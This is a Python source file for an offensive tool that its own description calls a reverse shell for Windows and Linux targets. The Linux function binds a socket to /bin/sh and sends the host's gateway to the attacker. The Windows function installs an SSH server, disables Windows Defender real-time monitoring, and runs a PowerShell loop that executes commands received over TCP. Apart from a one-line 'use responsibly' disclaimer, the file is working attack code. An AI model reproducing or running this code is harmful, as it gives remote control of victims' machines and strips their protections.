import os
import subprocess
import sys
os.system("pip install psutil")
import psutil
import struct
import platform
import socket
import argparse

author = "Gokul B"


parser = argparse.ArgumentParser(description="A Python script for creating a reverse shell on target systems, supporting Windows and Linux platforms. Use responsibly and with proper authorization.")

parser.add_argument(
    "-ip",
    nargs=1,
    help="Ip to connect with target"
)
parser.add_argument(
    '-port',
    nargs=1,
    help="Specify the port to connect"
)

args = parser.parse_args()

if args.ip and args.port:
    ip = args.ip[0]
    port = int(args.port[0])
else:
    print("Both IP and port arguments are required.")
    sys.exit(1)


class Details:
    def __init__(self, ip, port):
        self.os = os.name
        self.ip = ip
        self.port = port


    ## FOR WINDOWS
    def windows(self):
        """Function is only work if the host has a Windows Operating system It will create a Reverse Shell"""


        os.system("pip install psutil")
        ps_process = subprocess.Popen(["powershell", "-NoProfile", "-NoExit", "-Command", "-"],
                                      stdin=subprocess.PIPE,
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE,
                                      text=True)
        ##### THE COMMANDS
        command = [
            "Get-WindowsFeature -Name OpenSSH-Server",  ######SETUP A SSH SERVER START
            "Add-WindowsFeature -Name OpenSSH-Server",
            "Start-Service sshd",
            "Set-Service -Name sshd -StartupType 'Automatic'",####SSH END
            "Set-MpPreference -DisableRealtimeMonitoring $true",  ##Disabling the Windows Defender
            "$ip = '127.0.0.1'",  ###########CHANGE THE IP
            "$port = 9191",         #############CHANGE THE PORT
            "$tcpClient = New-Object System.Net.Sockets.TcpClient",
            "$tcpClient.Connect($ip, $port)",
            "$stream = $tcpClient.GetStream()",
            "$writer = New-Object System.IO.StreamWriter($stream)",
            "$reader = New-Object System.IO.StreamReader($stream)",
            "$writer.AutoFlush = $true",
            "while ($true) {",
            "    $input = $reader.ReadLine()",
            "    $output = Invoke-Expression $input 2>&1",
            "    $writer.WriteLine($output)",
            "}",
            "$tcpClient.Close()"
        ]  # The PowerShell commands to run

        combined_command = ";".join(command)

        # Run the PowerShell command and capture the output
        stdout, stderr = ps_process.communicate(input=combined_command)
        stderr = str(stderr)
        if stderr:
            print(f"Error: {stderr}")
        else:
            print(f"Output: {stdout}")

    #######LINUX###############
    def linux(self):
        os.system("pip install psutil")
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((self.ip,self.port))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        gateway = self.get_default_gateway()
        s.send(gateway.encode())
        subprocess.call(["/bin/sh","-i"])


    def get_default_gateway(self):  #### Gateway
        """This function will identify the Default Gateway of the Device """
        if platform.system() == "Windows":
            for interface, stats in psutil.net_if_stats().items():
                if "defaultgateway" in stats:
                    return stats["defaultgateway"]
        elif platform.system() == "Linux":
            with open("/proc/net/route") as route_file:
                for line in route_file.readlines():
                    fields = line.strip().split()
                    if fields[1] == "00000000":
                        return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
        return None

    ## TO IDENTIFY THE HOST OS
    def os_define(self):
        if self.os == "posix":
            print("It's a Unix-like operating system (e.g., Linux)")
            self.linux()

        elif self.os == "nt":
            print("It's a Windows-based operating system")
            self.windows()

        else:
            sys.exit()

    def print_details(self):
        print(f"Operating system: {self.os}")

details = Details(ip, port)
details.os_define()
details.print_details()
